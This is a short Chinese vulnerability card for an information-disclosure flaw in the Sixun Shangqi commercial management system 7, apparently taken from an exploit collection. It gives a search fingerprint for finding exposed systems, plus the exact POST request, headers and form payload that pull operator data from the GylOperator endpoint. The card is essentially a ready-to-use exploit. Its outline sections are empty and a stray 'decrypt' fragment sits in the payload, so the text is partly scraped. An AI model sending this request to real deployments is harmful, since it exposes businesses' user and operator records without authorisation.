# 思迅商旗商业管理系统7GylOperator存在信息泄露漏洞

- **系统**：思迅商旗商业管理系统7GylOperator　|　**类型**：信息泄露　|　**CVE**：—
- **指纹**：`app.name=="思迅商旗"`
- **请求**：`POST /api/GylOperator/LoadData HTTP/1.1`
- **关键头**：`Content-Length: 68`　`Content-Type: application/x-www-form-urlencoded; charset=UTF-8`　`X-Requested-With: XMLHttpRequest`

**请求体 / payload**
```
loadAll=false&key=&oper_role=&gridFlag=GylOperatorList&page=1&rows=1

解密\

```

**其他**
- 思迅商旗商业管理系统7 GylOperator存在信息泄露漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 思迅商旗商业管理系统7